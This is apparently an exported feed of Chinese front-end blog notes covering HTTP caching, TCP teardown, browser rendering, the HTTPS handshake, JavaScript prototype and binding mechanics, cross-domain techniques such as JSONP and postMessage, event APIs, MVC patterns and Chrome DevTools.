服务器再次收到资源请求时，根据浏览器传过来If-None-Match和然后再根据资源生成一个新的ETag，如果这两个值相同就说明资源没有变化，否则就是有变化；如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。与Last-Modified不一样的是，当服务器返回304 Not Modified的响应时，由于ETag重新生成过，response header中还会把这个ETag返回，即使这个ETag跟之前的没有变化。 浏览器收到304的响应后，就会从缓存中加载资源。 【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】一般都是同时启用，这是为了处理Last-Modified不可靠的情况。有一种场景需要注意： 分布式系统里多台机器间文件的Last-Modified必须保持一致，以免负载均衡到不同机器导致比对失败； 分布式系统尽量关闭掉ETag(每台机器生成的ETag都会不一样）; 当ctrl+f5强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；当f5刷新网页时，跳过强缓存，但是会检查协商缓存； 关闭http连接服务器将响应报文通过TCP连接发送回浏览器，浏览器接收HTTP响应，然后根据情况选择关闭TCP连接或者保留重用，关闭TCP连接的四次握手如下： 主动方发送Fin=1， Ack=Z， Seq= X报文 被动方发送ACK=X+1， Seq=Z报文 被动方发送Fin=1， ACK=X， Seq=Y报文 主动方发送ACK=Y， Seq=X报文4次挥手过程状态：（可参考下图） FIN_WAIT_1: 这个状态要好好解释一下，其实FIN_WAIT_1和FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2状态还有时常常可以用netstat看到。（主动方）FIN_WAIT_2：上面已经详细解释了这种状态，实际上FIN_WAIT_2状态下的SOCKET，表示半连接，也即有一方要求close连接，但另外还告诉对方，我暂时还有点数据需要传送给你(ACK信息)，稍后再关闭连接。（主动方）TIME_WAIT: 表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。（主动方）CLOSING（比较少见）: 这种状态比较特殊，实际情况中应该是很少见，属于一种比较罕见的例外状态。正常情况下，当你发送FIN报文后，按理来说是应该先收到（或同时收到）对方的 ACK报文，再收到对方的FIN报文。但是CLOSING状态表示你发送FIN报文后，并没有收到对方的ACK报文，反而却也收到了对方的FIN报文。什么情况下会出现此种情况呢？其实细想一下，也不难得出结论：那就是如果双方几乎在同时close一个SOCKET的话，那么就出现了双方同时发送FIN报文的情况，也即会出现CLOSING状态，表示双方都正在关闭SOCKET连接。CLOSE_WAIT: 这种状态的含义其实是表示在等待关闭。怎么理解呢？当对方close一个SOCKET后发送FIN报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。接下来呢，实际上你真正需要考虑的事情是察看你是否还有数据发送给对方，如果没有的话，那么你也就可以 close这个SOCKET，发送FIN报文给对方，也即关闭连接。所以你在CLOSE_WAIT状态下，需要完成的事情是等待你去关闭连接。（被动方）LAST_ACK: 这个状态还是比较容易好理解的，它是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，也即可以进入到CLOSED可用状态了。（被动方）CLOSED: 表示连接中断。 渲染页面1、构建DOM树 Tokenizing：根据HTML规范将字符流解析为标记 Lexing：词法分析将标记转换为对象并定义属性和规则 DOM construction：根据HTML标记关系将对象组成DOM树 2、解析过程中遇到图片、样式表、js文件，启动下载3、构建CSSOM树： Tokenizing：字符流转换为标记流 Node：根据标记创建节点 CSSOM：节点创建CSSOM树 4、根据DOM树和CSSOM树构建渲染树: 从DOM树的根节点遍历所有可见节点，不可见节点包括：1）script,meta这样本身不可见的标签。2)被css隐藏的节点，如display: none 对每一个可见节点，找到恰当的CSSOM规则并应用 发布可视节点的内容和计算样式 5、布局呈现树构造完成后浏览器便进行布局处理，及计算每个呈现树节点的大小和位置信息。有人可能要问，前面已将样式附着到DOM节点上，不是已经有了样式信息为何还要计算大小。这里可以这样理解，以上包含大小的样式信息只是存在内存里，并没有实际使用，浏览器要根据窗口的实际大小来处理呈现树节点的实际显示大小和位置，比如对于margin为auto的处理。布局是一个递归过程，从跟呈现节点开始，递归遍历子节点，计算集合几何信息。 6、绘制布局完成后，便是将呈现树绘制出来显示在屏幕上。对于每一个呈现树节点来说，主要绘制顺序如下： 背景颜色 背景图片 边框 子呈现树节点 轮廓 7、js解析 浏览器创建Document对象并解析HTML，将解析到的元素和文本节点添加到文档中，此时document.readystate为loading HTML解析器遇到没有async和defer的script时，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用document.write()把文本插入到输入流中。同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作script和他们之前的文档内容 当解析器遇到设置了async属性的script时，开始下载脚本并继续解析文档。脚本会在它下载完成后尽快执行，但是解析器不会停下来等它下载。异步脚本禁止使用document.write()，它们可以访问自己script和之前的文档元素 当文档完成解析，document.readState变成interactive 所有defer脚本会按照在文档出现的顺序执行，延迟脚本能访问完整文档树，禁止使用document.write() 浏览器在Document对象上触发DOMContentLoaded事件 此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些内容完成载入并且所有异步脚本完成载入和执行，document.readState变为complete,window触发load事件 8.特殊情况 js修改了css样式，就会触发重绘，如果修改了位置和大小，就要重新布局 js如果插入了dom节点，就会生成Dom树依次执行上面几个过程 如果css样式放在了页面的底部，那么首先展现出来的页面是没有样式的，只有加载和解析了底部的css，才会生成CSSOM树，再对应到DOM树种，因为页面的解析是自上而下的 显示页面（HTML解析过程中会逐步显示页面）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[https理解]]></title>
      <url>http://yoursite.com/2017/03/14/https%E7%90%86%E8%A7%A3/</url>
      <content type="text"><![CDATA[第一次客户端请求告诉服务器客户端的一些情况： 支持的协议版本，比如TLS 1.0版。 一个客户端生成的随机数，稍后用于生成”对话密钥”。 支持的加密方法，比如RSA公钥加密。 支持的压缩方法。 第一次服务器响应 服务器收到客户端的请求，会做出如下响应： 确认使用的加密通信协议版本，比如TLS 1.0版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。 一个服务器生成的随机数，稍后用于生成”对话密钥”。 确认使用的加密方法，比如RSA公钥加密。 服务器证书。 客户端收到响应1、什么是证书？证书是第三方机构颁发给服务器的，第三方机构的秘钥 加密 服务器的公钥 存放在证书中 2、如何验证证书的真伪？客户端拿到证书后，根据证书上的方法自己生成一个证书编号，如果生成的证书编号与证书上的证书编号相同，那么说明这个证书是证实的。 3、如何保证证书编号的真实？用第三方秘钥加密证书编号此处我的理解：如果中间人用公钥解开证书编号，篡改后，因为没有秘钥，无法再回复之前的状态，会破坏这个证书的状态 4、第三方的公钥存在什么地方呢？浏览器和操作系统都会维护一个权威的第三方机构列表（包括他们的公钥）。因为客户端接收到的证书中会写有颁发机构，客户端就根据这个颁发机构的值在本地找相应的公钥 5、CA如何颁发给我们的网站管理员，而网站管理员又如何将这个数字证书放到服务器上的呢？ 签署合同，确认支付方式 准备CSR并选择确认方式 在线提交申请 确认申请颁发证书 上面介绍一下证书！那么在验证证书的真实的情况下，通过第三方的公钥解密出服务器端的公钥！那么还会做下面几件事： 一个随机数。该随机数用服务器公钥加密，防止被窃听。 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。 客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验。 为什么会出现三个随机数呢？“不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于SSL协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。对于RSA密钥交换算法来说，pre-master-key本身就是一个随机数，再加上hello消息中的随机，三个随机数通过一个密钥导出器最终导出一个对称密钥。pre master的存在在于SSL协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么pre master secret就有可能被猜出来，那么仅适用pre master secret作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器加上pre master secret三个随机数一同生成的密钥就不容易被猜出了，一个伪随机可能完全不随机，可是是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。” 此时三个随机数在客户端就可以生成一个“会话秘钥” 服务器的最后响应服务器收到客户端的第三个随机数之后，计算生成本次会话所用的”会话密钥”。然后，向客户端最后发送下面信息。 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。 服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验 至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过双方都用”会话密钥”加密内容。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[caller-callee]]></title>
      <url>http://yoursite.com/2017/03/14/caller-callee/</url>
      <content type="text"><![CDATA[这两个属性在严格模式下都不可用 caller在一个函数调用另一个函数时，被调用函数会自动生成一个caller属性，指向调用它的函数对象。如果该函数当前未被调用，或并非被其他函数调用，则caller为null。function testCaller() &#123; var caller = testCaller.caller; alert(caller);&#125; function aCaller() &#123; testCaller();&#125; aCaller(); callee当函数被调用时，它的arguments.callee对象就会指向自身，也就是一个对自己的引用。由于arguments在函数被调用时才有效，因此arguments.callee在函数未调用时是不存在的（即null.callee），且解引用它会产生异常。function aCallee(arg) &#123; alert(arguments.callee); &#125; function aCaller(arg1, arg2) &#123; aCallee();&#125; aCaller();]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[深入理解__proto__ 、constructor和prototype的关系]]></title>
      <url>http://yoursite.com/2017/03/13/%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
      <content type="text"><![CDATA[proto和prototype 该属性在各个浏览器下的实现差别也许比较大.Firefox是最先实现的这个属性，我们通常用的proto属性都是从Object.prototype上继承下来的。 8个构造器：Number.__proto__ === Function.prototypeBoolean.__proto__ === Function.prototypeString.__proto__ === Function.prototypeObject.__proto__ === Function.prototype Function.__proto__ === Function.prototype Array.__proto__ === Function.prototypeRegExp.__proto__ === Function.prototypeError.__proto__ === Function.prototypeDate.__proto__ === Function.prototype 特殊的对象：Math.__proto__ === Object.prototypeJSON.__proto__ === Object.prototype 构造器的原型的类型：typeof Function.prototype === function //特殊typeof Object.prototype === object typeof Number.prototype === object typeof Boolean.prototype === object typeof String.prototype === object typeof Array.prototype === object typeof RegExp.prototype === object typeof Error.prototype === objecttypeof Date.prototype === object typeof Object.prototype === object constructor记住constructor是prototype上面的属性就行了！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[typeof-instanceof]]></title>
      <url>http://yoursite.com/2017/03/13/typeof-instanceof/</url>
      <content type="text"><![CDATA[typeoftypeof undefined //'undefined'typeof null //'object'typeof true //'boolean'typeof 123 //'number'typeof 'abc' //'string'typeof function() &#123;&#125; //'function'typeof &#123;&#125; //'object'typeof [] //'object'typeof unknownVariable //'undefined' instanceof模拟解析过程如下：function _instanceof(A, B) &#123; var O = B.prototype;// 取B的显示原型 A = A.__proto__;// 取A的隐式原型 while (true) &#123; //Object.prototype.__proto__ === null if (A === null) return false; if (O === A)// 这里重点：当 O 严格等于 A 时，返回 true return true; A = A.__proto__; &#125;&#125; Object instanceof Object解析,执行_instanceof (Object, Object)O = Object.prototype;A = Object.__proto__ = Function.prototypeA = Function.prototype.__proto__ = Object.prototypereturn true;Function instanceof Function解析,执行_instanceof (Function, Function)O = Function.prototype;A = Function.__proto__ = Function.prototype;return true;Function instanceof Object解析,执行_instanceof (Function, Object)O = Object.prototype;A = Function.__proto__ = Function.prototype;A = Function.prototype.__proto__ = Object.prototype;return true;String instanceof String解析,执行_instanceof (String, String)O = String.prototype;A = String.__proto__ = Function.prototype;A = Function.prototype.__proto__ = Object.prototype;A = Object.prototype.__proto__ = null;return false;function Ben()&#123;&#125;Ben instanceof Ben解析,执行_instanceof (Ben, Ben)O = Ben.prototype;A = Ben.__proto__ = Function.prototype;A = Function.prototype.__proto__ = Object.prototype;A = Object.prototype.__proto__ = null;return false;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[call-apply-bind]]></title>
      <url>http://yoursite.com/2017/03/12/call-apply-bind/</url>
      <content type="text"><![CDATA[call、apply区别 func.call(obj, a, b, c) func.apply(obj, [a, b, c]) apply相比于call有何妙用呢？如下： function log()&#123; console.log.apply(console, arguments);&#125;;log(1); //1log(1,2); //1 2 log参数事先不知道会是多少个，所以用apply就可以模糊传参，当然参数至少是数组或者类数组，而如果使用call，就需要把数组或者类数组转化成单个参数，就会比较麻烦。 bindfunc.bind(obj, a, b)(c, d) bind第一次绑定上下文不会执行，还需再加一个小括号才会执行，a、b、c、d会一起作为参数传入，官方兼容实现如下： if (!Function.prototype.bind) &#123; Function.prototype.bind = function (oThis) &#123; if (typeof this !== "function") &#123; // closest thing possible to the ECMAScript 5 internal IsCallable function throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable"); &#125; var aArgs = Array.prototype.slice.call(arguments, 1), fToBind = this, fNOP = function () &#123;&#125;, fBound = function () &#123; return fToBind.apply(this instanceof fNOP &amp;&amp; oThis ? this : oThis || window, aArgs.concat(Array.prototype.slice.call(arguments))); &#125;; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound; &#125;; &#125; this instanceof fNOP &amp;&amp; oThis ? this : oThis || window 解释： 如果没有new绑定上下文后的方法，那么执行的时候返回的上下文是oThis或者window 如果有new，this instanceof fNOP肯定是真，如果有参数，oThis也是真，返回this即new出来的fBound对象，此对象的原型链指向fToBind的原型链，相当于对原函数做了一次new 如果有new，this instanceof fNOP肯定是真，如果没有参数，oThis是假，fToBind内部的上下文就变成了window，如下：var f = func.bind();new f(); 经笔者在Chrome下测试，发现上面第三条有错误嫌疑，结果和第二条相同，所以可以把&amp;&amp; oThis去掉，但是笔者不清楚是版本的问题还是浏览器实现的问题！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[跨域方式]]></title>
      <url>http://yoursite.com/2017/03/12/%E8%B7%A8%E5%9F%9F/</url>
      <content type="text"><![CDATA[跨域的概念页面与页面之间和浏览器与服务器之间进行通信，如果协议、域名、端口有任何一个不同，都被当作是不同的域，此时的通信是不被浏览器同源策略所允许的。那么如何解决跨域呢？大概有如下一些常用的方法！ jsonp 首先浏览器端先定义一个执行函数：function dosomething(json)&#123; //to do something&#125; 在页面插入一个script标签，url=&#39;http://XXXX?callback=dosomething&#39;，此时就会向服务器发送这么个请求。 当服务器接收到这个请求，就会把callback当做一个key，然后得到这个key对应的value值，此处是dosomething；key也可以不是callback,开发者可以定义其他的字符串代替，当然前端要告诉后端这个key是什么！ 后端获得了value是dosomething,就会做下面的操作，就是拼接出一个参数是json的执行函数，返回给前端 dosomething+"("+json+")" 页面加载这个js代码，就会直接执行，那么就可以在dosomething这个函数体里面做自己想做的事！ document.domain主要适用于不同iframe框架之间的通信，但要注意的是，document.domain的设置是有限制的，我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同！两个页面都要设置！ 不过如果你想在http://www.example.com/a.html 页面中通过ajax直接请求http://example.com/b.html 页面，即使你设置了相同的document.domain也还是不行的，所以修改document.domain的方法只适用于不同子域的框架间的交互。如果你想通过ajax的方法去与不同子域的页面交互，除了使用jsonp的方法外，还可以用一个隐藏的iframe来做一个代理。原理就是让这个iframe载入一个与你想要通过ajax获取数据的目标页面处在相同的域的页面，所以这个iframe中的页面是可以正常使用ajax去获取你要的数据的，然后就是通过我们刚刚讲得修改document.domain的方法，让我们能通过js完全控制这个iframe，这样我们就可以让iframe去发送ajax请求，然后收到的数据我们也可以获得了。 window.name+iframe 特点：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。 比如有一个www.example.com/a.html页面,需要通过a.html页面里的js来获取另一个位于不同域上的页面www.cnblogs.com/data.html里的数据。 data.html页面里的代码很简单，就是给当前的window.name设置一个a.html页面想要得到的数据值。data.html里的代码： 在a.html页面中使用一个隐藏的iframe来充当一个中间人角色，src设为www.cnblogs.com/data.html 待data.html加载完成后，将此iframe指向www.example.com/b.html，那么b.html就可以通过windwo.name获取data.html 待b.html加载完成，那么a.html页面就可以获取data.html中的数据 window.postMessage window.postMessage(message,targetOrigin)方法是html5新引进的特性，可以使用它来向其它的window对象发送消息，无论这个window对象是属于同源或不同源，目前IE8+、FireFox、Chrome、Opera等浏览器都已经支持window.postMessage方法 调用postMessage方法的window对象是指要接收消息的那一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数targetOrigin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符*。 需要接收消息的window对象，可是通过监听自身的message事件来获取传过来的消息，消息内容储存在该事件对象的data属性中window.onmessage = function(e)&#123; e = window.event || e; var data = e.data; //是传递来的message var source = e.source; //发送消息的窗口对象 var origin = e.origin; //发送消息窗口的源（协议+主机+端口号）&#125; 跨域资源共享CORS此种跨域方式就请移步峰哥的文章跨域资源共享 CORS 详解，这篇文章说的很详细！ XDomainRequest ie8+浏览器跨域请求的ajax对象 跨域请求（XDRs）匿名保护用户数据，就是说服务器不能确定谁在请求数据。为了防止泄露数据给恶意的站点，不鼓励启用XDRs请求。 跨域请求要页面和服务器之间双方同意才行。使用 XDomainRequest (XDR) 创建对象，链接到服务器，文档请求服务器时添加一个Origin 请求头代表请求源，只有当服务器设置了 Access-Control-Allow-Origin 响应头为* 或者为发送请求的url地址。var xdr; function readdata() &#123; var dRes = document.getElementById('dResponse'); dRes.innerText = xdr.responseText; alert("Content-type: " + xdr.contentType); alert("Length: " + xdr.responseText.length); &#125; function err() &#123; alert("XDR onerror"); &#125; function timeo() &#123; alert("XDR ontimeout"); &#125; function loadd() &#123; alert("XDR onload"); alert("Got: " + xdr.responseText); &#125; function progres() &#123; alert("XDR onprogress"); alert("Got: " + xdr.responseText); &#125; function stopdata() &#123; xdr.abort(); &#125; function mytest() &#123; var url = document.getElementById('tbURL'); var timeout = document.getElementById('tbTO'); if (window.XDomainRequest) &#123; xdr = new XDomainRequest(); if (xdr) &#123; xdr.onerror = err; xdr.ontimeout = timeo; xdr.onprogress = progres; xdr.onload = loadd; xdr.timeout = tbTO.value; xdr.open("get", tbURL.value); xdr.send(); &#125; else &#123; alert("Failed to create"); &#125; &#125; else &#123; alert("XDR doesn't exist"); &#125; &#125; 其他跨域方式还有flash、在服务器上设置代理页面等跨域方式，不过笔者不会flash，也没尝试过服务器设置代理页面这种方式！以上几种方法可以满足大部分的业务需求了！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[addEventListener和attachEvent 区别]]></title>
      <url>http://yoursite.com/2017/03/05/%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A%E5%8C%BA%E5%88%AB/</url>
      <content type="text"><![CDATA[1、addEventListenertarget.addEventListener(type, listener, useCapture); 兼容性：ie9+及现代浏览器 type：字符串，事件名称，不含“on”，比如“click”、“mouseover”、“keydown”等 useCapture：是否使用捕捉，一般用false（冒泡） 删除方式：removeEventListener(event,function,capture/bubble) 执行顺序：定义最早的最先执行 作用域：this指向绑定的元素 FF下event对象有target,但没有srcElement属性,chrome下都有 event有currentTarget event有stopPropagation，stopImmediatePropagation cancelBubble属性只能用于阻止冒泡，无法阻止捕获阶段。该值可读写，默认值是false。当设置为true时，cancelBubble可以取消事件冒泡 event支持preventDefault 第二个参数可以是对象，事件会自动在传入对象中寻找handleEvent方法（ie9+支持） 2、attachEventtarget.attachEvent(type, listener); 兼容性：ie5到ie10 type：字符串，事件名称，含“on”，比如“onclick”、“onmouseover”、“onkeydown”等 useCapture：无 删除方式：detachEvent(event,function) 执行顺序：定义最早的最后执行 作用域：this指向window ie8-下event对象有srcElement,但没有target属性 ie8-下event没有currentTarget ie8-下event没有stopPropagation，stopImmediatePropagation，ie也支持cancelBubble ie8-下event没有cancelable(只读) ie8-下event对象没有eventPhase ie8-下event不支持preventDefault，但是支持returnValue=false ie8-下event不支持defaultPrevented(只读)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[理解中的MVC、MVP和MVVM]]></title>
      <url>http://yoursite.com/2016/12/16/MVC/</url>
      <content type="text"><![CDATA[一直理解不了MVC的架构模式，不过最近在看发布的业务代码，仿佛有了新的突破，所以写篇博客记录一下 MVP&lt;select id="selAnimal"&gt; &lt;option value="cat"&gt;cat&lt;/option&gt; &lt;option value="fish"&gt;fish&lt;/option&gt; &lt;option value="bird"&gt;bird&lt;/option&gt; &lt;/select&gt; &lt;p id="whatDoesThisAnimalDo"&gt;&lt;/p&gt; &lt;script type="text/javascript"&gt; // whatDoesAnimalDo 就是一个controllervar whatDoesAnimalDo = &#123; // 选择视图 start: function() &#123; this.view.start(); &#125;, // 将用户的操作映射到模型的更新上 set: function(animalName) &#123; this.model.setAnimal(animalName); &#125;,&#125;;// whatDoesAnimalDo的数据modelwhatDoesAnimalDo.model = &#123; // animal的数据 animalDictionary: &#123; cat: "meows", fish: "swims", bird: "flies" &#125;, // 当前的animal，也就是这个application的状态 currentAnimal: null, // 数据模型负责业务逻辑和数据存储 setAnimal: function(animalName) &#123; this.currentAnimal = this.animalDictionary[animalName] ? animalName : null; this.onchange(); &#125;, // 并且通知视图更新显示 onchange: function() &#123; whatDoesAnimalDo.view.update(); &#125;, // 还需要响应视图对当前状态的查询 getAnimalAction: function() &#123; return this.currentAnimal ? this.currentAnimal + " " + this.animalDictionary[this.currentAnimal] : "wuff?"; &#125;&#125;;// whatDoesAnimalDo的视图whatDoesAnimalDo.view = &#123; // 用户输入触发onchange事件 start: function() &#123; document.getElementById('selAnimal').onchange = this.onchange; &#125;, // 该事件将用户请求发送给控制器 onchange: function() &#123; whatDoesAnimalDo.set(document.getElementById('selAnimal').value); &#125;, // 视图更新显示的方法，其中视图会向model查询当前的状态，并将其显示给用户 update: function() &#123; document.getElementById('whatDoesThisAnimalDo').innerHTML = whatDoesAnimalDo.model.getAnimalAction(); &#125;&#125;;whatDoesAnimalDo.start();&lt;/script&gt; 上面是一段实现MVC的小清新的代码，从中可以看出，UI绑定的事件在View层做，通过View层给Controller做一个指示，Controller调用指定的Model去做数据上操作，操作完成，Model就是调用View层刷新页面！过程如下：Controller可以作为一个中继器，为View层命令分发到对应的Model层，比如发布，有很多UI组件，UI组件即创建了视图也加入了业务逻辑，可以看成是View和Model的结合体。那么当组件与组件间有交互时，可以通过Controller中转，相当于一个Controller对应于很多个View和Model。 MVPMVP模式斩断了View层和Model层的联系，完全通过Presenter层做桥梁：渲染View的功能也放在了Presenter层中。 MVVMMVVM和MVP有点类似，如图： ViewModel是整个架构的核心，连接着View和Model，View做了很多声明式绑定（按照一定规则），Model就是要操作的数据。ViewModel根据声明的规则把Model的数据映射到View层，同时对View层的操作和自身数据做监听。 参照大神的MVVM框架设计，代码的核心就是对每个需要监控的属性，都会生成set与get的访问控制器。无论是绑定事件还是用户在控制台修改，只要修改了被监控的属性，就会在访问控制器中做处理，把处理后的数据反映到View层并且更新Model层，即这就是所谓数据驱动！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Chrome-debug]]></title>
      <url>http://yoursite.com/2016/12/14/Chrome-debug/</url>
      <content type="text"><![CDATA[面试经常有人问你，你熟悉chrome调试工具吗？真的熟悉了吗？那么小生来总结一下，有些操作确实不常用！ Sources 我们知道js打断点，可是还有两种断点不常用 DOM Breakpoints Subtree Modifications：对dom节点的child做添加，删除或者修改，就会触发 Attributes Modifications：对dom节点的属性做添加，删除或者修改，就会触发 Node Removal：对dom节点进行删除，就会触发 XHR Breakpoints 当右侧的url和请求的url匹配时就会出现断点！ Call Stack调用栈当断点执行到某一程序块处停下来后，右侧调试区的 Call Stack 会显示当前断点所处的方法调用栈，从上到下由最新调用处依次往下排列，Call Stack 列表的下方是Scope Variables列表可以查看此时局部变量和全局变量的值。图中可以看出，我们最先走了toggleTab这个方法，然后走到了一个更新对象的方法上，当前调用在哪里，箭头会帮你指向哪里，同时我们可以点击，调用栈列表上的任意一处，即可回头再去看看代码但是若你想从新从某个调用方法出执行，可以右键Restart Frame， 断点就会跳到此处开头重新执行，Scope 中的变量值也会依据代码从新更改，这样就可以回退来从新调试，错过的调试也可以回过头来反复查看 Network1、控制Network的外观和功能 红色1号是Network是否记录网络请求的开关（这些按钮一试便知，不具体操作） 红色2号可以清楚网络日志 红色3号可以捕捉屏幕，打开按钮，重新刷新页面，会获取一张张页面加载过程的图像，点击图像，log也会相应变化 View改变overview和log记录表的外观 Preserve log是否保存上一次的网络日志 Disable cache缓存是否可用，打上勾网络请求就不会走本地缓存 offline这部分可以模拟无网、2G、3G等网速的请求 2、Filters 控制Requests Table具体显示哪些内容 输入框可以输入过滤条件，可以写正则表达式 hide data urls 可以隐藏base64请求 后面的按钮可以只显示对应的网络日志 3、Summary 显示总的请求数、数据传输量、加载时间信息DOMContentLoaded和load这两个事件会高亮显示 DOMContentLoaded事件会在页面上DOM完全加载并解析完毕之后触发，不会等待CSS、图片、子框架加载完成。load事件会在页面上所有DOM、CSS、JS、图片完全加载完毕之后触发。 DOMContentLoaded事件在Overview上用一条蓝色竖线标记，并且在Summary以蓝色文字显示确切的时间。 load事件同样会在Overview和Requests Table上用一条红色竖线标记，在Summary也会以红色文字显示确切的时间。 4、Requests Table 按资源获取的前后顺序显示所有获取到的资源信息，点击资源名可以查看该资源的详细信息Initiator 标记请求是由哪个对象或进程发起的（请求源） Parser： 请求由Chrome的HTML解析器时发起的。 Redirect：请求是由HTTP页面重定向发起的。 Script：请求是由Script脚本发起的。 Other：请求是由其他进程发起的，比如用户点击一个链接跳转到另一个页面或者在地址栏输入URL地址。 5、Timeline瀑布流 Queuing 排队的时间花费。可能由于该请求被渲染引擎认为是优先级比较低的资源（图片）、服务器不可用、超过浏览器的并发请求的最大连接数（Chrome的最大并发连接数为6） Stalled 从建立HTTP连接请求发出到请求能够被发出送出去(真正传输数据)之间的时间花费。包含用于处理代理的时间，如果有已经建立好的连接，这个时间还包括等待已建立连接被复用的时间。 Proxy Negotiation 与代理服务器连接的时间花费。(包含于Stalled) DNS Lookup 执行DNS查询的时间。网页上每一个新的域名都要经过一个DNS查询。第二次访问浏览器有缓存的话，则这个时间为0。 Initial Connection建立连接的时间花费，包含了TCP握手及重试时间。 SSL 完成SSL握手的时间花费，包含于Initial Connection中。 Request sent 发起请求的时间 Waiting (Time to first byte (TTFB)) 是最初的网络请求被发起到从服务器接收到第一个字节这段时间，它包含Request sent时间 Content Download 获取Response响应数据的时间花费。 TTFB这个部分的时间花费如果超过200ms，则应该考虑对网络进行性能优化了，可以参见网络性能优化方案及里面的相关参考文档。 通过按住Shift并且把光标移到资源名称上，可以查看该资源是由哪个对象或进程发起的（请求源）和对该资源的请求过程中引发了哪些资源（依赖资源）。在该资源的上方第一个标记为绿色的资源就是该资源的发起者（请求源），有可能会有第二个标记为绿色的资源是该资源的发起者的发起者，以此类推 Timeline 说实话在所有的部分中，timeline最难，当初刚接触前端时，师傅就让我总结devtools，当时就卡在此处，两年后的我再来看一下。 该面板主要包括4大块：1、Controls 开始、停止和配置什么信息将要被获取2、Overview 网页性能的概要3、Flame Chart CPU堆栈轨迹可视化表4、Details 当选择一个指定的事件后，会显示这个事件的更多信息；当没有选择事件时，会显示指定的时间帧信息 Flame Chart里面的虚竖线含义：蓝色标记DOMContentLoaded事件；绿色标记第一次的绘制时间点；红色代表load事件。 其中第2块Overview显示了网页性能相关的概要信息，可以通过鼠标或者区域边界上的灰色滑块来拖出一个指定区域范围，Flame Chart会跟着局部放大显示指定区域内的详情信息。 可以通过键盘上的W,S来放大和缩小指定区域，通过A,D来向左或向右移动指定区域。 Overview部分包括三个图标： FPS 每秒的帧数(Frames Per Second)，绿色柱状条越高，则每秒帧数越高，上方的红色柱状是一个长帧，在这个过程中可能发生jank CPU使用情况 这里的面积图标记着消耗CPU资源的各类事件 NET 各种颜色的柱状条分别显示一种资源。柱状条越长，代表获取这个资源的时间越长 CPU面积图中各颜色的含义：蓝色代表HTML文件；黄色代表脚本文件；紫色代表样式文件；绿色代表媒体文件；灰色代表其它杂项文件。NET图表柱状条两种颜色的含义：较亮的部分表示等待时间（当资源被请求时，直到第一个字节被下载的时间)；较暗的部分表示传输时间(在第一个和最后一个字节被下载之间的时间)。 支持两种网页录制操作：①录制网页加载，②录制网页交互。为了便于分析，录制的时间不宜太长、还要避免不必要的交互操作、并禁用浏览器的缓存和插件。 当你在Flame Chart中选择一个事件，Detail面板就会展示此事件额外的信息。Summary会展现所有的事件信息，另外的部分仅仅对某些事件有效，详细请看Timeline event reference 在录制之前点击Controls中的Screenshots复选框，可以在录制过程中捕获截屏，鼠标在Overview上从左向右移动则可以看到录制的动画。 在录制之前点击Controls中的JS Profile复选框，可以在时间轴中捕获JavaScript的堆栈信息(会产生一定的性能消耗)，并且在Flame Chart(火焰图)中会显示所有被调用的JavaScript函数信息。 在录制之前点击Controls中的Paint复选框，可以获取绘制事件的更多细节信息（注意这会产生很多的性能消耗）。如果要深入了解网页渲染方面的信息，可以点击DevTools右上角的菜单，在More tools里面选中Rendering settings，这里面包含了如下设置项： Paint Flashing 高亮显示网页中需要被重绘的部分。 Layer Borders 显示Layer边界。 FPS Meter 每一秒的帧细节，帧速率的分布信息和GPU的内存使用情况。 Scrolling Performance Issues 分析鼠标滚动时的性能问题，会显示使屏幕滚动变慢的区域。 Emulate CSS Media 